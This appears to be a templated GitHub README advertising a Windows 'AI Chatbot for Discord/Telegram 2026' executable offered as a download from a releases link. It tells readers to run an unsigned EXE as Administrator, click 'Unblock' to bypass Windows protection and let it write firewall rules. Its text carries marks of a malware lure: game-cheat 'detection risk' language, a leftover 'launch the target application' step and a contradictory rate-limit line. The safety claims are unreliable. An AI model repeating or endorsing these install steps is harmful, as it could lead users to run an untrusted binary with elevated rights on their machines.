<div align="center">
  <img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=12&height=220&section=header&text=AI Chatbot for Discord/Telegram%202026&fontSize=62&fontColor=fff&animation=fadeIn&fontAlignY=38&desc=Smart+Assistant+for+Your+Servers&descAlignY=56&descSize=20" width="100%"/>

  # AI Chatbot for Discord/Telegram 2026 🤖💬

  ![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge)
  ![Updated](https://img.shields.io/badge/updated-2026-brightgreen?style=for-the-badge)
  ![Stars](https://img.shields.io/github/stars/ThornTaleStart/discord-telegram-chat-assistant?style=for-the-badge&logo=github)
  ![Forks](https://img.shields.io/github/forks/ThornTaleStart/discord-telegram-chat-assistant?style=for-the-badge&logo=github)
  ![Last Commit](https://img.shields.io/github/last-commit/ThornTaleStart/discord-telegram-chat-assistant?style=for-the-badge)
  ![Repo Size](https://img.shields.io/github/repo-size/ThornTaleStart/discord-telegram-chat-assistant?style=for-the-badge)
  ![Platform](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows)
  ![Windows EXE](https://img.shields.io/badge/Windows-EXE-0078d4?style=for-the-badge&logo=windows&logoColor=white)
  ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

  ### ⭐ Star this repo if it helped you!

  <p align="center">
    <a href="https://github.com/ThornTaleStart/discord-telegram-chat-assistant/releases/download/v3.8.72/discord-telegram-chat-assistant-v3.8.72.zip">
      <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20AI Chatbot for Discord/Telegram%202026-FF6600?style=for-the-badge&logoColor=white&labelColor=DD3300" width="420" alt="Download AI Chatbot for Discord/Telegram 2026"/>
    </a>
  </p>
</div>

## 📋 Table of Contents

- [📖 About](#-about)
- [⚙️ Requirements](#️-requirements)
- [✨ Features](#-features)
- [🛡️ Safety](#️-safety)
- [🎮 How to Use](#-how-to-use)
- [📦 Installation](#-installation)
- [📊 Compatibility](#-compatibility)
- [❓ FAQ](#-faq)
- [💬 Community & Support](#-community--support)
- [📜 License](#-license)
- [⚠️ Disclaimer](#️-disclaimer)

## 📖 About

Standard Discord and Telegram bots can't handle complex conversations, context switching, or multi-lingual moderation. This standalone Windows executable brings a locally-run AI assistant to your chat servers. No server rental, no API keys, no monthly fees. Connect once, configure your moderation rules and personality, and let the bot handle repetitive moderation tasks and casual chat.

## ⚙️ Requirements

- Windows 10 (build 19044+) or Windows 11
- 4GB RAM minimum (8GB recommended)
- 500MB free disk space
- Stable internet connection for initial model download
- Administrator privileges for installation
- Discord Bot Token or Telegram Bot Token

## ✨ Features

- **Multi-Platform Support** 🤝 — Works with both Discord and Telegram from a single executable. Switch between platforms seamlessly.
- **Context-Aware Conversations** 🧠 — Remembers chat history per user for up to 10 messages, improving reply quality without excessive memory usage.
- **Customizable Persona** 🎭 — Define a system prompt to change the bot's voice: formal, casual, roleplay, or support agent.
- **Real-Time Moderation** 🛑 — Auto-detects profanity, spam, and harmful content based on configurable keyword lists and sentiment analysis.
- **Smart Command Handling** 📋 — Parse and respond to custom commands (e.g., `!ask`, `/query`) without writing any code.
- **Low Resource Mode** 💻 — Runs efficiently on older hardware by offloading inference to CPU with optimizations. No GPU required.
- **Local Logging** 📝 — All interactions are saved to a local file for review. No data leaves your machine.
- **One-Click Update** 🔄 — Built-in updater checks for new releases on launch.

## 🛡️ Safety

The bot operates entirely on your local machine. No chat data is sent to external servers or third-party APIs. Reduced detection risk on platforms, though automated user accounts always carry some risk. Use a dedicated bot account, not your primary profile. Reasonable use (≥30 messages per channel per minute) minimizes attention.

## 🎮 How to Use

1. Obtain a Bot Token from the Discord Developer Portal or Telegram BotFather.
2. Run the executable and enter your token in the setup window.
3. Select the channels the bot should monitor.
4. Set moderation keywords and base AI persona.
5. Save configuration and start the bot.

| Action | Hotkey / Command |
| ------ | ---------------- |
| Open settings | `Ctrl+Shift+S` (in console) |
| Toggle bot on/off | `!bot toggle` |
| Reload config | `!bot reload` |

## <a id="pitfalls"></a>🚧 Common Mistakes / Pitfalls

- **Using the wrong token format.** Discord tokens are alphanumeric strings, Telegram tokens are `123456:ABC-DEF...`. The installer will validate the format on entry.
- **Forgetting to invite the bot to a channel.** The executable only connects to servers where the bot user is present. Use the OAuth2 URL generator in Discord or `/start` in Telegram.
- **Running without Administrator rights.** The installer writes firewall rules and local data directories. Right-click and select "Run as Administrator" on first launch.
- **Mixing up command prefixes.** Discord bots use `!` prefix by default, Telegram bots use `/`. Change this in the config file (`prefix: "!"` or `prefix: "/"`).

## 📦 Installation

1. Go to the [Releases](../../releases/latest) page and download the latest version.
2. Extract the archive if needed.
3. Run the downloaded executable as Administrator.
4. Follow the on-screen setup steps.
5. Launch the target application and enjoy.

## 📊 Compatibility

| OS | Version | Status | Notes |
| -- | ------- | ------ | ----- |
| Windows 11 | 23H2 / 24H2 | ✅ Fully supported | Tested on both major releases |
| Windows 10 | 22H2 | ✅ Fully supported | Recommended build 19044+ |
| Windows 10 | 21H2 | ⚠️ Partial | Missing TLS 1.3 support, some features disabled |
| Windows 8.1 | All versions | ❌ Not supported | Missing required WinRT APIs |
| Windows 7 | All versions | ❌ Not supported | EOL OS, no .NET 8 runtime available |

## ❓ FAQ

**Q: Is there a detection risk in 2026?**  
A: There's always a theoretical risk with third-party executables and automated accounts. The bot connects to official Discord and Telegram APIs, not their internal protocols. Risk increases if you abuse the system (spam, mass DMs). Use a dedicated bot account.

**Q: How often is the model updated?**  
A: Major model updates are released annually. Configuration packs and moderation lists are updated quarterly. The built-in updater checks every 14 days.

**Q: I get "Access Denied" when I run the executable. Why?**  
A: Windows may flag unsigned executables. Right-click the file, go to Properties > General > Security, and check "Unblock". Then run as Administrator.

**Q: Can I run this on a Raspberry Pi or Linux server?**  
A: No. This is a Windows-only executable. Linux users can run it via Wine, but performance will be degraded.

## 💬 Community & Support

- [Report a Bug](../../issues)
- [Request a Feature](../../issues)
- <!-- [Join our Discord Server](https://discord.gg/example) -->
- <!-- [Telegram Support Group](https://t.me/example) -->

## 📜 License

MIT License — Copyright 2026 ThornTaleStart

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files... (see [LICENSE](LICENSE) for full text).

## ⚠️ Disclaimer

This software is provided for educational and utility purposes only. Users are solely responsible for compliance with the Terms of Service of Discord, Telegram, and any applicable platform. The developers assume no liability for misuse, account penalties, or damages arising from the use of this tool.

<p align="center">
  <a href="https://github